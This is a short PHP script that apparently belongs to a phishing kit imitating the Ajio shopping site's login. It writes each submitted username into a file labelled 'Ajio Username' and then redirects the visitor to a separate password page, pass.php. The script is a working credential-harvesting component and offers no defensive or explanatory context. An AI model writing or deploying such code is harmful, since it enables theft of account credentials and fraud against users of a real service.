<?php
file_put_contents("usernames.txt", "Ajio Username: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: pass.php');
exit();
?>